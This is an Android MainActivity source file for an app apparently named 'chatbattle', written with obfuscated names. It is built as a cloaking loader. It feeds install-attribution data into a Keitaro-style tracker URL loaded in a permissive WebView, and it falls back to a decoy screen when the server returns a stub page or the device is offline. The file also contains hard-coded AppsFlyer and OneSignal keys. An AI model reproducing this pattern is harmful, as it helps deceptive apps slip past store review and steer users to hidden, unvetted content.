package bom.kombi.chatbattle;


import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import com.onesignal.OneSignal;
import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.tohellik.magerik.R;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    WebView webliue;
   WebSettings bemsetingos;
    PendingIntent pendingIntent;
    int baleromse;
    Yueisdf httpURLConnection;
    ProgressBar progressBar;
    private String urlhost = "";
    static NetworkInfo netInfo;
    public boolean isWasUsed = false;

    private static final String AF_DEV_KEY = "GDqSaoJNiNSSqjxRx9j4Fd";
    private static final String ONESIGNAL_APP_ID = "96eb9883-8a36-420c-a10c-74eb598d0856";

    SharedPreferences mSettings;
    public static final String APP_PREFERENCES = "myurl";
    public static final String APP_PREFERENCES_URL = "url"; // имя кота
    String urlGo = "https://dateheroes.xyz/Ponyee"; // ТУТ СВОЙ ПОТОК КЕЙТАРО
    SharedPreferences.Editor editor;

    public ValueCallback<Uri[]> uploadMessage;
    private ValueCallback<Uri> mUploadMessage;
    public static final int REQUEST_SELECT_FILE = 1;
    private final static int FILECHOOSER_RESULTCODE = 1;
    private String mCM;
    private ValueCallback<Uri> mUM;
    private ValueCallback<Uri[]> mUMA;
    private final static int FCR=1;

    @SuppressLint("JavascriptInterface")
    @Override
    protected void onResume() {
        super.onResume();
        final View decorView = getWindow().getDecorView();
        decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN);
        decorView.setOnSystemUiVisibilityChangeListener
                (new View.OnSystemUiVisibilityChangeListener() {
                    @Override
                    public void onSystemUiVisibilityChange(int visibility) {
                        if ((visibility & View.SYSTEM_UI_FLAG_FULLSCREEN) == 0) {
                            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN);
                        }
                    }
                });
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


// Enable verbose OneSignal logging to debug issues if needed.
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        // OneSignal Initialization
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);
        setContentView(R.layout.activity_main);
        progressBar = (ProgressBar) findViewById(R.id.progressBar);
       /// getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                ///WindowManager.LayoutParams.FLAG_FULLSCREEN);
        mSettings = getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE);
        if(mSettings.contains(APP_PREFERENCES_URL)) {
            urlGo = mSettings.getString(APP_PREFERENCES_URL, "");
            Log.e("URL сохранённый",urlGo);
        }


        AppsFlyerConversionListener conversionListener = new AppsFlyerConversionListener() {

            @Override
            public void onConversionDataSuccess(Map<String, Object> conversionData) {
                for (String attrName : conversionData.keySet()) {
                    Log.d("LOG_TAG", "atribute: " + attrName + " = " + conversionData.get(attrName));
                }
                if (conversionData.get("af_status").equals("Non-organic")) {
                    String name = (String) conversionData.get("campaign");
                      String afData = "sub_id_3=" + name;
                      Nowist(afData);
                    return;
                } else {
                    String  afData = "sub_id_3=organik";
                    System.out.println("ablom"+afData);
                    Nowist(afData);
                    return;
                }
            }

            @Override
            public void onConversionDataFail(String errorMessage) {
                Log.d("LOG_TAG", "error getting conversion data: " + errorMessage);
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> attributionData) {

                for (String attrName : attributionData.keySet()) {
                    Log.d("LOG_TAG", "attribute: " + attrName + " = " + attributionData.get(attrName));
                }

            }

            @Override
            public void onAttributionFailure(String errorMessage) {
                Log.d("LOG_TAG", "error onAttributionFailure : " + errorMessage);
            }
        };




        Intent intent = getIntent();
//        String action = intent.getAction();
        Uri data = intent.getData();
        try {
            urlhost = data.getQuery();
            urlhost = "?" + urlhost;
        } catch (Exception e) {
            e.printStackTrace();
        }


        if(isOnline(this)) {
            AppsFlyerLib.getInstance().init(AF_DEV_KEY, conversionListener, this);
            AppsFlyerLib.getInstance().startTracking(this);
            FacebookSdk.setAutoInitEnabled(true);
            FacebookSdk.fullyInitialize();
            AppLinkData.fetchDeferredAppLinkData(this,
                    new AppLinkData.CompletionHandler() {
                        @Override
                        public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                            if (appLinkData != null) {
                                final String popitka2 = appLinkData.getTargetUri().getQuery();
                                urlhost = "?" + popitka2;

                            } else {

                                Log.i("DEBUG_FACEBOOK_SDK", "AppLinkData is Null");

                                final String popitka3 = AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext());
                                urlhost = "?sub_id_2=" + popitka3;
                                System.out.println("uspex");
                               
                            }
                        }
                    }
            );
        }
        else
        {
            onejese();
        }
    }





    public void Nowist(String afData)

    {

        final String urlLoads = urlGo + urlhost+"&"+afData;

        httpURLConnection = new Yueisdf();
        httpURLConnection.start();
        try {
            httpURLConnection.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        baleromse = httpURLConnection.intoservolus();
        if (baleromse != 404) {
            webliue = findViewById (R.id.iueyqwsssf);

            webliue.post(new Runnable()
            {
                @Override
                public void run() {
                    if (isWasUsed == false) {
                        webliue.loadUrl(urlLoads);
                        isWasUsed = true;
                    }
                   /* if (android.os.Build.VERSION.SDK_INT >= 24) {
                        CookieManager.getInstance().setAcceptThirdPartyCookies(webliue, true);
                    } else {
                        CookieManager.getInstance().setAcceptCookie(true);
                    }
                    webliue.getSettings().setDomStorageEnabled(true);
                    webliue.getSettings().setJavaScriptEnabled(true);
                    webliue.getSettings().setSupportMultipleWindows(true);

                    webliue.getSettings().setAllowFileAccess(true);
*/
                   bemsetingos = webliue.getSettings();
                    if (android.os.Build.VERSION.SDK_INT >= 24) {
                        CookieManager.getInstance().setAcceptThirdPartyCookies(webliue, true);
                    } else {
                        CookieManager.getInstance().setAcceptCookie(true);
                    }
                    bemsetingos.setJavaScriptEnabled(true);
                    bemsetingos.setJavaScriptCanOpenWindowsAutomatically(true);
                    bemsetingos.setDomStorageEnabled(true);
                    bemsetingos.setBuiltInZoomControls(true);
                    bemsetingos.setSupportZoom(true);
                    bemsetingos.setDisplayZoomControls(false);
                    webliue.setInitialScale(1);
                    webliue.getSettings().setLoadWithOverviewMode(true);
                    webliue.getSettings().setSupportMultipleWindows(true);
                    webliue.getSettings().setUseWideViewPort(true);

                    webliue.getSettings().setAllowContentAccess(true);
                    webliue.getSettings().setAllowFileAccess(true);

                    webliue.setWebChromeClient(new WebChromeClient() {
                        //For Android 3.0+

                        public boolean onShowFileChooser(
                                WebView webView, ValueCallback<Uri[]> filePathCallback,
                                WebChromeClient.FileChooserParams fileChooserParams) {
                            if (mUMA != null) {
                                mUMA.onReceiveValue(null);
                            }
                            mUMA = filePathCallback;
                            if (Build.VERSION.SDK_INT >= 23 && (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)) {
                                ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.CAMERA}, 1);
                            }
                            Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                            if (takePictureIntent.resolveActivity(MainActivity.this.getPackageManager()) != null) {
                                File photoFile = null;
                                try {
                                    photoFile = createImageFile();
                                    takePictureIntent.putExtra("PhotoPath", mCM);
                                } catch (IOException ex) {

                                }
                                if (photoFile != null) {
                                    mCM = "file:" + photoFile.getAbsolutePath();
                                    takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(photoFile));
                                } else {
                                    takePictureIntent = null;
                                }
                            }
                            Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
                            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
                            contentSelectionIntent.setType("*/*");
                            Intent[] intentArray;
                            if (takePictureIntent != null) {
                                intentArray = new Intent[]{takePictureIntent};
                            } else {
                                intentArray = new Intent[0];
                            }

                            Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
                            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
                            chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser");
                            chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
                            startActivityForResult(chooserIntent, FCR);
                            return true;
                        }
                    });

                    if (18 < Build.VERSION.SDK_INT )
                    {
                        webliue.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);
                    }

                    if (Build.VERSION.SDK_INT >= 19)
                    {
                        webliue.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
                    }



                    webliue.addJavascriptInterface(new melovsting(), "HTMLOUT");

                    webliue.setWebViewClient(new WebViewClient(){

                        public void onPageFinished(WebView view, String url) {
                            progressBar.setVisibility(ProgressBar.INVISIBLE);
                            view.loadUrl("javascript:window.HTMLOUT.showHTML('<html>'+document.getElementsByTagName('html')[0].innerHTML+'</html>');");
                            CookieSyncManager.getInstance().sync();
                            urlGo = webliue.getUrl();

                            editor = mSettings.edit();
                            editor.putString(APP_PREFERENCES_URL, urlGo);
                            editor.apply();

                        }

                        public void onPageStarted(WebView view, String url,
                                                  Bitmap favicon) {


                        }


                        public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest request) {

                            return false;
                        }


                    });
                }
            });


        }
        else {
            onejese();
        }



    }

    public void onejese()
    {

        Intent intent = new Intent(this, GLjkjsdf.class);
        startActivity(intent);


    }

    class melovsting
    {

        @JavascriptInterface
        public void showHTML(String html_data) {
            Log.e("", " ======>  HTML Data : "+  html_data);
            if (html_data.compareToIgnoreCase("<html><head><style>body{margin:0}</style></head><body><!--contacts with us--></body></html>") == 0) {
                Log.e("", "Error 1");
                onejese();
            } else {
                Log.e("", "Error 2");

            }


        }

    }




    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent intent){


        super.onActivityResult(requestCode, resultCode, intent);
        if(Build.VERSION.SDK_INT >= 21){
            Uri[] results = null;
            //Check if response is positive
            if(resultCode== Activity.RESULT_OK){
                if(requestCode == FCR){
                    if(null == mUMA){
                        return;
                    }
                    if(intent == null){
                        //Capture Photo if no image available
                        if(mCM != null){
                            results = new Uri[]{Uri.parse(mCM)};
                        }
                    }else{
                        String dataString = intent.getDataString();
                        if(dataString != null){
                            results = new Uri[]{Uri.parse(dataString)};
                        }
                    }
                }
            }
            mUMA.onReceiveValue(results);
            mUMA = null;
        }else{
            if(requestCode == FCR){
                if(null == mUM) return;
                Uri result = intent == null || resultCode != RESULT_OK ? null : intent.getData();
                mUM.onReceiveValue(result);
                mUM = null;
            }
        }
    }

    @Override
    public void onBackPressed() {
        if (webliue.canGoBack()) {
            webliue.goBack();
        } else {
            super.onBackPressed();
        }
    }

    private File createImageFile() throws IOException{
        @SuppressLint("SimpleDateFormat") String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        String imageFileName = "img_"+timeStamp+"_";
        File storageDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        return File.createTempFile(imageFileName,".jpg",storageDir);
    }
    public static boolean isOnline(Context context)
    {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        netInfo = cm.getActiveNetworkInfo();
        if (netInfo != null && netInfo.isConnectedOrConnecting())
        {
            return true;
        }
        return false;
    }




}
